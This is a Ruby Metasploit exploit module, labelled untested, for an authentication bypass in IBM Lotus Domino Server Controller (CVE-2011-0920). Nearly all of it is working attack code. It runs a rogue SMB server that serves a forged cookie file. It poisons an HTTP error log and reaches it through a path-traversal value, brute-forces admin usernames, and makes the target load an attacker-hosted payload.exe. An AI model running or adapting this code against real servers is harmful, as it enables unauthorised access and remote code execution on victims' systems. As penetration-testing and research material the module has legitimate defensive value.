
require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::SMBServer

	def initialize(info ={})
		super(
		'Name'	      => '[UNTESTED] IBM Lotus Domino Server Controller Authentication Bypass',
		'Description'	=> %q{
			This module exploits a authentication bypass in Lotus Domino Server Controller 8.0.x -. There are 3 way	to exploit this vulnereability:
			1) Authenticate in lotus console using	UNC path to cookie file on smb share. It was fixed in 8.5.3.
			2) Authenticate in lotus console using server log file.
			3) SMB relay. Also was fixed in 8.5.3.
			This module exploit 1 and 2 way.  Since version 8.5.3 console use client ssl cert.
		},
		'License'	 => MSF_LICENSE,
		'Author'	      => 
			[
				'Alexander Minozhenko', # author measploit module
				'Alexey Sintsov', # dicovery exploit via http log file
				'Patrik Karlsson' #original discovery
			],
		'References'	 =>
			[ 
				['CVE','2011-0920'],
				['EDB','18179']
			],
		'Payload'	      => {},
		'Targets'	      => [ ['Automatic', {} ] ],
		'Platform'	 => 'win',
		'DisclosureDate' => 'Mar 22 2011'
		)
		register_options( [
				Opt::RPORT(2050),
				OptInt.new('HTTPPORT',[false, 'Port of http server',47001]),
				OptString.new('HTTPLOGPATH',[false, 'Path to log on the server',"..\\..\\..\\..\\..\\windows\\system32\\logfiles\\httperr\\httperr1"]),
				OptPath.new('SSLCert',	  [ false, 'Path to a lotus SSL certificate']),
				OptPath.new('SSLKey',	 [ false, 'Path to a lotus SSL private key']),
				OptEnum.new('Method',[false,'Method using for exploitation','cookiefile',['cookiefile','logfile']])
				], self.class)
		@count_buf = 0
		@files = {}
	end

	
	SMB_QUERY_FILE_BASIC_INFO = Rex::Struct2::CStructTemplate.new(
								[ 'uint64v', 'CreationTime', 0],
								[ 'uint64v', 'LastAccessTime', 0],
								[ 'uint64v', 'LastWriteTime', 0],
								[ 'uint64v', 'LastChangeTime', 0],
								[ 'uint32v', 'FileAttr', 20],
								[ 'uint32v', 'Reserved',0]
								)

	SMB_QUERY_FILE_NETWORK_OPEN_INFO = Rex::Struct2::CStructTemplate.new(
								[ 'uint64v', 'CreationTime', 0],
								[ 'uint64v', 'LastAccessTime', 0],
								[ 'uint64v', 'LastWriteTime', 0],
								[ 'uint64v', 'LastChangeTime', 0],
								['uint64v','AllocationSize', 0],
								['uint64v','EndOfFile',0],
								[ 'uint32v', 'FileAttr', 20],
								[ 'uint32v', 'Reserved',0]
								)

	SMB_QUERY_FILE_STANDART_INFO = Rex::Struct2::CStructTemplate.new(
								['uint64v','AllocationSize', 0],
								['uint64v','EndOfFile',0],
								['uint32v','NumberOfLinks',1],
								['uint8','DeletePending',0],
								['uint8','Directory',0]
								)

	SMB_FIND_FILE_BOTH_DIRECTORY_INFO = Rex::Struct2::CStructTemplate.new(
									['uint16v','Padding',0],
									['uint32v','NextEntryOffset',0],
									['uint32v','FileIndex',0],
									[ 'uint64v', 'CreationTime', 0],
									[ 'uint64v', 'LastAccessTime', 0],
									[ 'uint64v', 'LastWriteTime', 0],
									[ 'uint64v', 'LastChangeTime', 0],
									['uint64v','EndOfFile',0],
									['uint64v','AllocationSize', 0],
									[ 'uint32v', 'FileAttr', 0x20],
									[ 'uint32v','FileNameLen',0],
									[ 'uint32v','EAListLength',0],
									[ 'uint8','ShortFileNameLen',0],
									[ 'uint8', 'Reserved',0],
									['string','ShortFileName',nil,''],
									[ 'string','FileName',nil,'']
									)							     
	
	def connect(global = true, opts={})

		dossl = true

		nsock = Rex::Socket::Tcp.create(
					'PeerHost'  =>	datastore['RHOST'],
					'PeerPort'  => (datastore['RPORT']).to_i,
					'LocalHost' =>	datastore['CHOST'] || "0.0.0.0",
					'LocalPort' => (datastore['CPORT'] || 0).to_i,
					'SSL'	    =>	dossl,
					'SSLVersion'=>	datastore['SSLVersion'],
					'SSLKey' => datastore['SSLKey'],
					'SSLCert' => datastore['SSLCert'],
					'Timeout'   => (datastore['ConnectTimeout'] || 10).to_i,
					'Context'   =>
					{
						'Msf'	     => framework,
						'MsfExploit' => self,
					})



		# enable evasions on this socket
		set_tcp_evasions(nsock)

		# Set this socket to the global socket as necessary
		self.sock = nsock if (global)

		# Add this socket to the list of sockets created by this exploit
		add_socket(nsock)

		return nsock
	end




	def get_allocsize(size)
		clust_size = 4096
		if size <= 1024
			return 1024
		else
			num = size / clust_size
			c = size % clust_size
			if c==0
				return num* clust_size
			else
				return (num+1) * clust_size
			end
		end
	end
	
	def smb_cmd_negotiate(c, buff)
		smb = @state[c]
		pkt = CONST::SMB_NEG_PKT.make_struct
		pkt.from_s(buff)

		# Record the remote process ID
		smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']


		dialects = pkt['Payload'].v['Payload'].gsub(/\x00/, '').split(/\x02/).grep(/^\w+/)


		dialect =
			dialects.index("NT LM 0.12") ||
			dialects.length-1
		
		
		pkt = CONST::SMB_NEG_RES_NT_PKT.make_struct
		smb_set_defaults(c, pkt)

		time_hi, time_lo = UTILS.time_unix_to_smb(Time.now.to_i)

		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NEGOTIATE
		pkt['Payload']['SMB'].v['Flags1'] = 0x98
		pkt['Payload']['SMB'].v['Flags2'] = 0xc853
		pkt['Payload']['SMB'].v['WordCount'] = 17
		pkt['Payload'].v['Dialect'] = dialect
		pkt['Payload'].v['SecurityMode'] = 3
		pkt['Payload'].v['MaxMPX'] = 2
		pkt['Payload'].v['MaxVCS'] = 1
		pkt['Payload'].v['MaxBuff'] = 4356
		pkt['Payload'].v['MaxRaw'] = 65536
		pkt['Payload'].v['Capabilities'] = 0x8000e3fd 
		pkt['Payload'].v['ServerTime'] = time_lo
		pkt['Payload'].v['ServerDate'] = time_hi
		pkt['Payload'].v['Timezone']   = 0x0


		pkt['Payload'].v['SessionKey'] = 0
		pkt['Payload'].v['KeyLength'] = 8
		
		pkt['Payload'].v['Payload'] = "\x00"*16

		
		c.put(pkt.to_s)
	end
	
	def smb_cmd_session_setup(c, buff)
		smb = @state[c]
		pkt = CONST::SMB_SETUP_NTLMV1_PKT.make_struct
		pkt.from_s(buff)
		
		smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
		smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
		smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
		smb[:user_id] =	 pkt['Payload']['SMB'].v['UserID']
		
		pkt = CONST::SMB_SETUP_RES_PKT.make_struct

		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_SESSION_SETUP_ANDX
		pkt['Payload']['SMB'].v['ProcessID'] = smb[:process_id].to_i
		pkt['Payload']['SMB'].v['UserID'] = rand(0xffff)
		pkt['Payload']['SMB'].v['MultiplexID'] = smb[:multiplex_id].to_i
		pkt['Payload'].v['WordCount']=4
		
		pkt['Payload'].v['AndX'] = 0xff
		data = "\x00\x00"*2
		pkt['Payload'].v['ByteCount'] = data.length
		pkt['Payload'].v['Payload'] = data
		pkt['Payload']['SMB'].v['Flags1']  = 0x98
		pkt['Payload']['SMB'].v['Flags2']  = 0xc807

		c.put(pkt.to_s)
	end
	
	def smb_cmd_tree_connect_andx(c, buff)
		smb = @state[c]
		pkt = CONST::SMB_TREE_CONN_PKT.make_struct

		pkt.from_s(buff)
		smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
		smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
		smb[:user_id] =	 pkt['Payload']['SMB'].v['UserID']
		path = pkt['Payload'].v['Payload']['Path']
		service = pkt['Payload'].v['Payload']['Service']
		payload = pkt['Payload'].v['Payload']

		pkt = CONST::SMB_TREE_CONN_EXT_RES_PKT.make_struct

		smb_set_defaults(c,pkt)
		smb[:tree_id] = rand(0xffff)
		pkt['Payload']['SMB'].v['TreeID'] = smb[:tree_id]
		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TREE_CONNECT_ANDX
		pkt['Payload'].v['AndX'] = 0xff
		pkt['Payload']['SMB'].v['Flags1']  = 0x98
		pkt['Payload']['SMB'].v['Flags2']  = 0xc807
		pkt['Payload']['SMB'].v['WordCount'] = 0x07
		pkt['Payload'].v['MaximalShareAccessRights'] = 0x001301bf
		pkt['Payload'].v['Payload']  = "A:\x00"+ Rex::Text.to_unicode("NTFS")+"\x00\x00"

		c.put(pkt.to_s)

	end

	def smb_cmd_nt_create(c, buff)
		smb = @state[c]
		pkt = CONST::SMB_CREATE_PKT.make_struct
		pkt.from_s(buff)
		smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
		
		smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
		smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
		smb[:user_id] =	 pkt['Payload']['SMB'].v['UserID']

		smbpayload = pkt['Payload'].v['Payload'].to_s[1..-1].split("\x00").join()


		pkt = CONST::SMB_CREATE_RES_PKT.make_struct
		pkt.from_s(buff)
		smb_set_defaults(c,pkt)
		pkt['Payload']['SMB'].v['Flags1']  = 0x98
		pkt['Payload']['SMB'].v['Flags2']  = 0xc807
		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NT_CREATE_ANDX

		if not @files.include?smbpayload
			pkt['Payload']['SMB'].v['ErrorClass'] = 0xc0000034
			pkt['Payload'].v['FileID'] = 0
			c.put(pkt.to_s)
			return
		end
		
		@fileid = @fileid+1
		pkt['Payload'].v['Action'] = 1
		pkt['Payload'].v['FileID'] = @fileid

		pkt['Payload'].v['IPCState'] = 0x0007
		pkt['Payload'].v['OpLock'] = 0x02
		pkt['Payload']['SMB'].v['WordCount'] = 42
		pkt['Payload'].v['Attributes'] = 0x00000020
		pkt['Payload'].v['AllocHigh'] = 0
		pkt['Payload'].v['AllocLow'] = get_allocsize(@files[smbpayload].length) #TODO: make on variable
		pkt['Payload'].v['EOFLow'] = @files[smbpayload].length
		pkt['Payload'].v['EOFHigh'] = 0 
		pkt['Payload'].v['FileType'] = 0x0000
		pkt['Payload'].v['IsDirectory'] = 0
		pkt['Payload'].v['Payload'] = ''

		@files[@fileid] = smbpayload
		
		c.put(pkt.to_s)
	end
	
	def set_time(info_struct)
		time= UTILS.time_unix_to_smb(Time.now.to_i).collect{ |x| x.to_s 16 }.reverse.join.to_i 16
		

		info_struct.v['LastAccessTime'] = time
		info_struct.v['CreationTime'] = time
		info_struct.v['LastWriteTime'] =time
		info_struct.v['LastChangeTime'] = time
		return info_struct
	end

	def smb_trans2(c,buff)
		
		smb = @state[c]
		pkt =  CONST::SMB_TRANS2_PKT.make_struct	  
		pkt.from_s(buff)

		smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
		smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
		smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
		smb[:user_id] =	 pkt['Payload']['SMB'].v['UserID']


		filename = (pkt['Payload'].to_s[74..-1]).delete("\x00")


		subcommand = pkt['Payload'].v['SetupData'].unpack('v')
		p=pkt['Payload'].to_s[-8..-1]
		level = p.unpack('vA')[0]

		respkt = CONST::SMB_TRANS_RES_PKT.make_struct
		smb_set_defaults(c,respkt)
		
		respkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TRANSACTION2
		respkt['Payload']['SMB'].v['Flags1']  = 0x98
		respkt['Payload']['SMB'].v['Flags2']  = 0xc807

		if (subcommand[0]  == CONST::TRANS2_QUERY_PATH_INFO)

			rpayload = pkt['Payload'].to_s
			info = SMB_QUERY_FILE_BASIC_INFO.make_struct			
			info_level = rpayload.to_s.split("\x00\x00\x00\x00")[-3].unpack('s')[0]
			if (info_level == 0) 
				q=rpayload.to_s.split("\x00") 
				info_level = rpayload.to_s.split("\x00")[-1].unpack('s')[0]
			end
			
			info = set_time(info)
			
			if @files.include?filename
				allocsize = get_allocsize(@files[filename].length)
				endoffile  = @files[filename].length
			else
				respkt['Payload']['SMB'].v['ErrorClass'] = 0xc0000034
				respkt['Payload']['SMB'].v['WordCount'] = 0
				respkt['Payload'].v['ByteCount'] = 0
				c.put(respkt.to_s)
				return 
			end
			fileattr = 20
			
			respkt['Payload']['SMB'].v['WordCount'] = 10
			respkt['Payload'].v['ParamCountTotal'] = 2
			respkt['Payload'].v['ParamCount' ] = 2
			respkt['Payload'].v['ParamOffset'] = 56 

			if (info_level == 1004)
				
				respkt['Payload'].v['DataCountTotal'] = 40
				respkt['Payload'].v['ByteCount'] = 45 
				respkt['Payload'].v['DataCount'] = 40
				respkt['Payload'].v['DataOffset'] = 60
				info.v['FileAttr']=0x10
				
				respkt['Payload'].v['Payload'] = "\x00" *5 + info.to_s 

				c.put(respkt.to_s)
				
			elsif (info_level == 1005)
				
				respkt['Payload'].v['ParamCountTotal'] = 2
				respkt['Payload'].v['ParamCount' ] = 2
				respkt['Payload'].v['DataOffset'] = 60
				respkt['Payload'].v['ParamOffset'] = 56
				info = SMB_QUERY_FILE_STANDART_INFO.make_struct
				isdir = 0 
				if (filename == "")					
					allocsize = 0
					endoffile = 0 
					isdir = 1
				end
				info.v['AllocationSize'] = allocsize
				info.v['EndOfFile'] = endoffile
				p=[allocsize , endoffile , 1,0,isdir,0].pack('QQLCCS')

				respkt['Payload'].v['DataCount'] = p.length
				p2 = "\x00" * 5 +  p 
				respkt['Payload'].v['Payload'] = p2
				respkt['Payload'].v['ByteCount'] =  p2.length
				respkt['Payload'].v['DataCountTotal'] = p.length
				
				c.put(respkt.to_s)
				
			elsif (info_level == 1034)

				info = SMB_QUERY_FILE_NETWORK_OPEN_INFO.make_struct
				info = set_time(info)
				info.v['AllocationSize'] = get_allocsize(@cookiefile.length)
				info.v['EndOfFile'] = @cookiefile.length
				respkt['Payload'].v['DataOffset'] = 60
				respkt['Payload'].v['DataCount'] = 56
				respkt['Payload'].v['DataCountTotal'] = 56
				p = "\x00" * 5 + info.to_s
				respkt['Payload'].v['Payload'] = p
				respkt['Payload'].v['ByteCount'] =  p.length

				c.put(respkt.to_s)

			end
			
		elsif (subcommand[0] == CONST::TRANS2_QUERY_FILE_INFO)

			
			respkt['Payload'].v['DataCount' ] =8
			respkt['Payload'].v['DataOffset'] = 60
			respkt['Payload'].v['ParamCount'] =2 
			respkt['Payload'].v['ParamCountTotal'] =2 
			respkt['Payload'].v['ParamOffset'] = 56
			respkt['Payload'].v['DataCountTotal' ] =8
			respkt['Payload']['SMB'].v['WordCount' ] =10
			
			p = [0,0,0x000100000000456e].pack('CLQ')
			respkt['Payload'].v['Payload'] = p
			respkt['Payload'].v['ByteCount'] = p.length
			
			c.put(respkt.to_s)
			
			
		elsif (subcommand[0] == CONST::TRANS2_FIND_FIRST2)
			pkt_data   = pkt.to_s[-43..-1]
			level = pkt_data.delete("\x00").unpack('SSSS')[2]
			filename = (pkt['Payload'].to_s[76..-1]).delete("\x00")
			filename = "" if filename == "\\*"
			allocsize = get_allocsize(@files[filename].length)
			endoffile  = @files[filename].length
			fileattr = 0x20
			respkt['Payload'].v['DataCountTotal'] =	  124
			respkt['Payload'].v['DataCount'] =   124
			respkt['Payload'].v['DataOffset'] = 68
			respkt['Payload'].v['ParamCount'] = 10 
			respkt['Payload'].v['ParamCountTotal'] = 10
			respkt['Payload'].v['ParamOffset'] = 56
			respkt['Payload']['SMB'].v['WordCount'] = 10

			parametrs = [0x0800,1,1,0,0].pack('SSSSS')
			filename = filename[1..-1].split("").collect{ |x| x+"\x00"}.join() unless filename == ""
			file_len = filename.length
			
			if level == 260
				data = SMB_FIND_FILE_BOTH_DIRECTORY_INFO.make_struct
				data = set_time(data)
				data.v['EndOfFile'] = endoffile
				data.v['AllocationSize'] =  allocsize
				data.v['FileNameLen'] = file_len
				data.v['FileName'] = filename
				data.v['ShortFileName'] = "\x00"*file_len
				data.v['FileAttr'] = fileattr

				p = "\x00"+parametrs + data.to_s + "\x00"*6
			elsif level == 259
				respkt['Payload'].v['DataCountTotal'] =	  36
				respkt['Payload'].v['DataCount'] =   36
				data= [0,0,file_len,filename].pack('LLLA*')
				p = "\x00"+parametrs+"\x00\x00" +data
			end
			respkt['Payload'].v['Payload'] = p
			respkt['Payload'].v['ByteCount'] = p.length
			c.put(respkt.to_s)
		end

		
	end
	

	def smb_read(c, buff)
		smb = @state[c]
		
		pkt =  CONST::SMB_READ_PKT.make_struct		
		pkt.from_s(buff)
		
		smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
		smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
		smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
		smb[:user_id] =	 pkt['Payload']['SMB'].v['UserID']
		fileid = pkt['Payload'].v['FileID'].to_i
		num_bytes = pkt['Payload'].v['MaxCountLow'].to_i
		offset = pkt['Payload'].v['Offset'].to_i
		
		pkt = CONST::SMB_READ_RES_PKT.make_struct
		smb_set_defaults(c,pkt)
		pkt['Payload']['SMB'].v['Flags1'] = 0x98 
		pkt['Payload']['SMB'].v['Flags2'] = 0xe807
		pkt['Payload']['SMB'].v['WordCount'] = 12
		
		
		fname = @files[fileid]
		@file = @files[fname][offset..offset+num_bytes-1]
		print_status("Sending file #{fname}")

		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_READ_ANDX
		pkt['Payload'].v['AndX'] = 0xff
		pkt['Payload'].v['DataLenLow'] = @file.length
		pkt['Payload'].v['DataOffset'] = 60
		pkt['Payload'].v['Remaining']= 0xffff
		pkt['Payload'].v['AnxOffset'] =0
		pkt['Payload'].v['DataCompaction'] =0
		pkt['Payload'].v['Reserverd1'] =0
		pkt['Payload'].v['DataLenHigh'] =0
		pkt['Payload'].v['Reserverd2'] = 0
		pkt['Payload'].v['Reserverd3'] = 0
		pkt['Payload'].v['Reserverd4'] = 0
		pkt['Payload'].v['Payload'] = "\x00" + @file

		c.put(pkt.to_s)
	end

	def smb_close(c, buff)
		smb = @state[c]
		pkt = CONST::SMB_CLOSE_PKT.make_struct
		
		pkt.from_s(buff)
		
		smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
		smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
		smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
		smb[:user_id] =	 pkt['Payload']['SMB'].v['UserID']
		
		pkt  = CONST::SMB_CLOSE_RES_PKT.make_struct
		smb_set_defaults(c,pkt)
		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_CLOSE
		pkt['Payload']['SMB'].v['Flags1']  = 0x98
		pkt['Payload']['SMB'].v['Flags2']  = 0xc807

		c.put(pkt.to_s)
	end
	
	def smb_tree_disconnect(c, buff)
		smb = @state[c]
		pkt = CONST::SMB_TREE_DISCONN_PKT.make_struct
		
		pkt.from_s(buff)
		
		smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
		smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
		smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
		smb[:user_id] =	 pkt['Payload']['SMB'].v['UserID']
		
		pkt  = CONST::SMB_TREE_DISCONN_RES_PKT.make_struct
		smb_set_defaults(c,pkt)
		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TREE_DISCONNECT
		pkt['Payload']['SMB'].v['Flags1']  = 0x98
		pkt['Payload']['SMB'].v['Flags2']  = 0xc807

		c.put(pkt.to_s)
	end

	def smb_nt_transact(c ,buff)
		smb = @state[c]
		pkt = CONST::SMB_NTTRANS_PKT.make_struct
		
		pkt.from_s(buff)
		
		smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
		smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
		smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
		smb[:user_id] =	 pkt['Payload']['SMB'].v['UserID']

		pkt  = CONST::SMB_NTTRANS_RES_PKT.make_struct
		smb_set_defaults(c,pkt)
		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NT_TRANSACT
		pkt['Payload']['SMB'].v['Flags1']  = 0x98
		pkt['Payload']['SMB'].v['Flags2']  = 0xc807


		pkt['Payload']['SMB'].v['WordCount'] = 18
		pkt['Payload'].v['DataCountTotal'] =   20
		pkt['Payload'].v['DataCount'] =	  20
		pkt['Payload'].v['DataOffset'] = 76
		pkt['Payload'].v['ParamCount'] = 4
		pkt['Payload'].v['ParamCountTotal'] = 4
		pkt['Payload'].v['ParamOffset'] = 72
		data = [1,0x8000,0,0,0,0].pack('SSLLLL')
		param = [data.length].pack('L')
		p = "\x00"+param+data
		pkt['Payload'].v['Payload'] = p
		pkt['Payload'].v['ByteCount'] =p.length

		c.put(pkt.to_s)
	end
	
	def smb_cmd_dispatch(cmd, c, buff)
		smb = @state[c]
		
		case cmd
		when CONST::SMB_COM_NEGOTIATE
			smb_cmd_negotiate(c, buff)

		when CONST::SMB_COM_SESSION_SETUP_ANDX
			smb_cmd_session_setup(c, buff)

		when CONST::SMB_COM_TREE_CONNECT_ANDX
			smb_cmd_tree_connect_andx(c, buff)
			
		when CONST::SMB_COM_NT_CREATE_ANDX
			smb_cmd_nt_create(c, buff)
			
		when CONST::SMB_COM_TRANSACTION2  
			smb_trans2(c, buff)
		when  CONST::SMB_COM_READ_ANDX
			smb_read(c, buff)

		when CONST::SMB_COM_CLOSE
			smb_close(c, buff)
			
		when CONST::SMB_COM_TREE_DISCONNECT
			smb_tree_disconnect(c, buff)
			
		when CONST::SMB_COM_NT_TRANSACT
			smb_nt_transact(c, buff)

		else
			print_status("Ignoring request from #{smb[:name]} (#{cmd})")
			pkt = CONST::SMB_BASE_PKT.make_struct
			pkt['Payload']['SMB'].v['Command'] = cmd
			pkt['Payload']['SMB'].v['Flags1']  = 0x88
			pkt['Payload']['SMB'].v['Flags2']  = 0xc001
			pkt['Payload']['SMB'].v['ErrorClass'] = 0 # 0xc0000022
			c.put(pkt.to_s)
		end
	end

	def httpport
		datastore['HTTPPORT']
	end

	def httplogpath
		datastore['HTTPLOGPATH']
	end

	def send_http_request(req,opts={})
		
		
		http_sock = Rex::Socket::Tcp.create(
						'PeerHost'	=>  opts['RHOST'] || rhost,
						'PeerPort'	=> (opts['HTTPPORT'] || httpport).to_i,
						'LocalHost' =>  opts['CHOST'] || chost || "0.0.0.0",
						'LocalPort' => (opts['CPORT'] || cport || 0).to_i,
						'Proxies'	=> proxies,
						'Timeout'	=> (opts['ConnectTimeout'] || connect_timeout || 10).to_i,
						'Context'	=>
						{
							'Msf'	 => framework,
							'MsfExploit' => self,
						})

		http_sock.put(req)
		print_status("Sending request #{req.split}")
		http_sock.shutdown
		http_sock.close

	end
	
	def brut_user
		begin_value = 'adminis'
		print_status("Brutforce users with began value: #{begin_value}")
		connect
		for prefix in 'a'..'z'
			username = prefix + begin_value
			sock.put("#UI #{username},pass\n")
			res = sock.get_once
			print_status("Received: #{res.split}")
			if (res =~ /WRONG_PASSWORD/)
				disconnect()
				print_status("Find valid user #{username}")
				return username
			elsif (res =~ /NOT_REG_ADMIN/)
				next
			end
		end
		
		print_status("Does not find valid user ")
		disconnect()
		
		return nil
	end
	def gener_payload
		print_status("Generate payload")
		payload = framework.payloads.create(datastore['PAYLOAD'])
		arch = payload.arch
		plat = payload.platform.platforms
		enc = datastore['ENCODER']
		buf = payload.generate_simple(
					'Format'	  => 'raw',
					'Options'	  => datastore,
					'Encoder'	  => enc)

		exe  = Msf::Util::EXE.to_executable_fmt(framework, arch, plat, buf,'exe-small',{})
		@files['\\npayload.exe'] = exe
	end

	def authorization(path,user='admin',password='pass')
		#
		# Authentificatinog in Lotus Domino Controller
		#

		print_status("Authorization")
		connect

		sock.put("#API\n")
		sock.put("#APPLET\n")
		sock.put("#COOKIEFILE #{path}\n")
		sock.put("#USERADDRESS home\n")

		sock.put("#UI #{user},#{password}\n")
		res=sock.get_once

		print_status("Received: #{res.split}")

		if (res =~ /WRONG_PASSWORD/)
			print_status("Wrong password")
		elsif (res =~ /VALID_USER/) 
			print_status("Valid user")
			gener_payload
			sock.put("#EXIT\n")
			sock.put("LOAD \\\\" << datastore['CHOST'] << "\\public\\payload.exe\n")
			
			return true
		elsif (res =~  /NOT_REG_ADMIN/	and (datastore['Method'] =~ /cookiefile|logfile/ ))
			user = brut_user()
			return authorization(path,user,password) unless user.nil?					    
			disconnect()
			return false
		end
	end


	
	def exploit 
		
		@fileid = 0x4000
		method = datastore['Method'].downcase
		user = 'admin'
		password = "pass"
		start_service()
		@files[""]=""


		if method == 'cookiefile'
			print_status("SMBServer started.")
			
			print_status("Create COOKIEFILE")
			@cookiefile = "	  <user name=\"#{user}\" cookie=\"#{password}\" address=\"home\">\x0d\x0a"
			
			@files['\\cookiefile.xml'] = @cookiefile
			path2cookie = "\\\\" << datastore['CHOST'] << "\\public\\cookiefile.xml"

		elsif (method == 'logfile')


			print_status("SMBServer started.")
			send_http_request("GET <user HTTP/1.0\r\n\r\n")
			send_http_request("GET name=\"#{user}\"cookie=\"#{password}\"address=\"home\"> HTTP/1.0\r\n\r\n")
			path2cookie = httplogpath
			print_status("Waiting")
			select(nil, nil, nil, 30)
		end

		authorization(path2cookie,user,password) 
		self.service.wait	 
	end
end

=begin
Note: We probably need to figure out how to put all the SMB code in the mixin.
Also, this module won't work unless other lib mods are applied, see the pull
request for details:
https://github.com/rapid7/metasploit-framework/pull/246
=end